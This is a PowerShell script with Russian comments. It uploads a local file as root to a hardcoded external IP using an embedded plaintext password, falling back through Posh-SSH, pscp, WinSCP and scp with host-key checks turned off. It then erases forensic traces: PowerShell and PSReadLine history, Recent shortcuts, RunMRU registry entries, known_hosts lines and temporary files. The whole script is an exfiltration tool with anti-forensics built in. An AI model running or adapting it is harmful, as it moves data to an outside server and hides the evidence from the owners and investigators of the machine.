#Requires -Version 5.1
<#
.SYNOPSIS
    Отправляет файл на 149.104.76.115 по SCP с автоматическим вводом пароля
    и зачищает следы выполнения на локальной машине.

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\send_and_wipe.ps1

.EXAMPLE
    .\send_and_wipe.ps1 -KeepHistory -RemoteDir /tmp
#>
[CmdletBinding()]
param(
    [string] $LocalFile  = 'C:\Windows\documents\users\user1\2b152adf_1KB.dat',
    [string] $RemoteHost = '149.104.76.115',
    [string] $RemoteUser = 'root',
    [string] $RemoteDir  = '/root',
    [string] $Password   = 'dde-703-45-a-aA!',
    [int]    $Port       = 22,
    [switch] $KeepHistory,     # не зачищать историю
    [switch] $ForgetHostKey,   # удалить отпечаток хоста из known_hosts
    [switch] $NoClear          # не чистить экран
)

$ErrorActionPreference = 'Stop'
$RemoteDir = $RemoteDir.TrimEnd('/')
$Leaf      = Split-Path -Leaf $LocalFile
$RemoteFile = "$RemoteDir/$Leaf"

# ---------------------------------------------------------------- проверки ---
if (-not (Test-Path -LiteralPath $LocalFile -PathType Leaf)) {
    throw "Файл не найден: $LocalFile"
}
$LocalSize = (Get-Item -LiteralPath $LocalFile).Length

function Write-Step($t) { Write-Host "[*] $t" -ForegroundColor Cyan }

# ------------------------------------------------------- транспорт 1: Posh-SSH
function Test-PoshSSH {
    if (Get-Module -ListAvailable -Name Posh-SSH) { return $true }
    Write-Step 'Posh-SSH не найден, ставлю из PSGallery...'
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        if (-not (Get-PackageProvider -Name NuGet -ListAvailable -ErrorAction SilentlyContinue)) {
            Install-PackageProvider -Name NuGet -Force -Scope CurrentUser -ErrorAction Stop | Out-Null
        }
        Install-Module Posh-SSH -Scope CurrentUser -Force -AllowClobber -ErrorAction Stop
        return $true
    } catch {
        Write-Host "    не удалось: $($_.Exception.Message)" -ForegroundColor DarkYellow
        return $false
    }
}

function Send-ViaPoshSSH {
    Import-Module Posh-SSH -ErrorAction Stop
    $sec  = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($RemoteUser, $sec)

    $sess = New-SSHSession -ComputerName $RemoteHost -Port $Port -Credential $cred -AcceptKey -ErrorAction Stop
    try {
        Set-SCPItem -Path $LocalFile -Destination $RemoteDir -ComputerName $RemoteHost -Port $Port `
                    -Credential $cred -AcceptKey -PathType Directory -ErrorAction Stop | Out-Null

        $out = (Invoke-SSHCommand -SessionId $sess.SessionId -Command "stat -c %s '$RemoteFile'" -ErrorAction Stop).Output -join ''
        $remoteSize = 0L
        [void][int64]::TryParse($out.Trim(), [ref]$remoteSize)
        if ($remoteSize -ne $LocalSize) {
            throw "Размер на сервере ($remoteSize) не совпал с локальным ($LocalSize)"
        }
    } finally {
        if ($sess) { Remove-SSHSession -SessionId $sess.SessionId -ErrorAction SilentlyContinue | Out-Null }
    }
}

# ------------------------------------------------------------ транспорт 2: pscp
function Test-Pscp { [bool](Get-Command pscp.exe -ErrorAction SilentlyContinue) }

function Send-ViaPscp {
    $pscp = (Get-Command pscp.exe -ErrorAction Stop).Source
    & $pscp -batch -q -P $Port -pw $Password $LocalFile "${RemoteUser}@${RemoteHost}:$RemoteDir/"
    if ($LASTEXITCODE -ne 0) { throw "pscp завершился с кодом $LASTEXITCODE" }
}

# ---------------------------------------------------------- транспорт 3: WinSCP
function Test-WinSCP {
    [bool](@("$env:ProgramFiles\WinSCP\WinSCPnet.dll",
             "${env:ProgramFiles(x86)}\WinSCP\WinSCPnet.dll") |
           Where-Object { Test-Path -LiteralPath $_ })
}

function Send-ViaWinSCP {
    $dll = @("$env:ProgramFiles\WinSCP\WinSCPnet.dll",
             "${env:ProgramFiles(x86)}\WinSCP\WinSCPnet.dll") |
           Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
    Add-Type -Path $dll -ErrorAction Stop

    $opts = New-Object WinSCP.SessionOptions
    $opts.Protocol      = [WinSCP.Protocol]::Scp
    $opts.HostName      = $RemoteHost
    $opts.PortNumber    = $Port
    $opts.UserName      = $RemoteUser
    $opts.Password      = $Password
    $opts.SshHostKeyPolicy = [WinSCP.SshHostKeyPolicy]::GiveUpSecurityAndAcceptAny

    $s = New-Object WinSCP.Session
    try {
        $s.Open($opts)
        $r = $s.PutFiles($LocalFile, "$RemoteDir/")
        $r.Check()
    } finally { $s.Dispose() }
}

# ------------------------------------- транспорт 4: нативный scp + SSH_ASKPASS
function Test-NativeScp { [bool](Get-Command scp.exe -ErrorAction SilentlyContinue) }

function Send-ViaAskPass {
    $scp = (Get-Command scp.exe -ErrorAction Stop).Source
    $ask = Join-Path $env:TEMP ('askpass_{0}.cmd' -f ([guid]::NewGuid().ToString('N')))
    Set-Content -LiteralPath $ask -Value "@echo off`r`necho $Password" -Encoding ASCII

    $oldAsk = $env:SSH_ASKPASS
    $oldReq = $env:SSH_ASKPASS_REQUIRE
    $env:SSH_ASKPASS = $ask
    $env:SSH_ASKPASS_REQUIRE = 'force'
    try {
        & $scp -q -P $Port -o StrictHostKeyChecking=accept-new -o NumberOfPasswordPrompts=1 `
               $LocalFile "${RemoteUser}@${RemoteHost}:$RemoteDir/"
        if ($LASTEXITCODE -ne 0) { throw "scp завершился с кодом $LASTEXITCODE" }
    } finally {
        $env:SSH_ASKPASS = $oldAsk
        $env:SSH_ASKPASS_REQUIRE = $oldReq
        Remove-Item -LiteralPath $ask -Force -ErrorAction SilentlyContinue
    }
}

# ------------------------------------------------------------------ отправка ---
Write-Step "Отправляю $LocalFile -> ${RemoteUser}@${RemoteHost}:$RemoteFile"

$done = $false
if (Test-PoshSSH) {
    try { Send-ViaPoshSSH; $done = $true; Write-Host '    [OK] Posh-SSH' -ForegroundColor Green }
    catch { Write-Host "    Posh-SSH: $($_.Exception.Message)" -ForegroundColor DarkYellow }
}
if (-not $done -and (Test-Pscp)) {
    try { Send-ViaPscp; $done = $true; Write-Host '    [OK] pscp' -ForegroundColor Green }
    catch { Write-Host "    pscp: $($_.Exception.Message)" -ForegroundColor DarkYellow }
}
if (-not $done -and (Test-WinSCP)) {
    try { Send-ViaWinSCP; $done = $true; Write-Host '    [OK] WinSCP' -ForegroundColor Green }
    catch { Write-Host "    WinSCP: $($_.Exception.Message)" -ForegroundColor DarkYellow }
}
if (-not $done -and (Test-NativeScp)) {
    try { Send-ViaAskPass; $done = $true; Write-Host '    [OK] scp + askpass' -ForegroundColor Green }
    catch { Write-Host "    scp: $($_.Exception.Message)" -ForegroundColor DarkYellow }
}

if (-not $done) {
    throw 'Ни один транспорт не сработал. Установите Posh-SSH: Install-Module Posh-SSH -Scope CurrentUser'
}
Write-Host "[OK] Файл доставлен: $RemoteFile ($LocalSize байт)" -ForegroundColor Green

# ---------------------------------------------------------------- зачистка ---
if (-not $KeepHistory) {
    Write-Step 'Зачищаю следы...'

    # 1. История текущей сессии PowerShell
    Clear-History -ErrorAction SilentlyContinue

    # 2. Файл истории PSReadLine: сначала запрещаем дозапись, потом удаляем
    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction Stop } catch {}

    $histPaths = @()
    try { $histPaths += (Get-PSReadLineOption).HistorySavePath } catch {}
    $histPaths += Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    foreach ($p in ($histPaths | Where-Object { $_ } | Select-Object -Unique)) {
        Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
    }

    # 3. Недавние документы (ярлык на отправленный файл)
    Get-ChildItem (Join-Path $env:APPDATA 'Microsoft\Windows\Recent') -Filter '*.lnk' -ErrorAction SilentlyContinue |
        Where-Object { $_.BaseName -like "*$Leaf*" -or $_.BaseName -like "*$RemoteHost*" } |
        Remove-Item -Force -ErrorAction SilentlyContinue

    # 4. Win+R (RunMRU)
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    $props  = Get-ItemProperty -Path $runKey -ErrorAction SilentlyContinue
    if ($props) {
        $letters = @()
        if ($props.MRUList) { $letters = $props.MRUList.ToCharArray() | ForEach-Object { [string]$_ } }
        foreach ($name in $props.PSObject.Properties.Name) {
            if ($name -in 'PSPath','PSParentPath','PSChildName','PSDrive','PSProvider','MRUList') { continue }
            $v = [string]$props.$name
            if ($v -match [regex]::Escape($RemoteHost) -or $v -match [regex]::Escape($Leaf) -or $v -match 'scp') {
                Remove-ItemProperty -Path $runKey -Name $name -ErrorAction SilentlyContinue
                $letters = $letters | Where-Object { $_ -ne $name }
            }
        }
        Set-ItemProperty -Path $runKey -Name MRUList -Value ($letters -join '') -ErrorAction SilentlyContinue
    }

    # 5. Отпечаток хоста (опционально)
    if ($ForgetHostKey) {
        $kh = Join-Path $env:USERPROFILE '.ssh\known_hosts'
        if (Test-Path -LiteralPath $kh) {
            Get-Content -LiteralPath $kh |
                Where-Object { $_ -notmatch [regex]::Escape($RemoteHost) } |
                Set-Content -LiteralPath $kh -Encoding ASCII -Force
        }
    }

    # 6. Временные файлы askpass (на случай обрыва)
    Get-ChildItem $env:TEMP -Filter 'askpass_*.cmd' -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
}

if (-not $NoClear) { Clear-Host }
Write-Host "Готово: $RemoteFile" -ForegroundColor Green
if (-not $KeepHistory) {
    Write-Host 'История PSReadLine, буфер команд, Recent и RunMRU вычищены.' -ForegroundColor DarkGray
    Write-Host 'Остатки: история F7 в conhost и файл самого скрипта — закрыть окно / удалить .ps1.' -ForegroundColor DarkGray
}
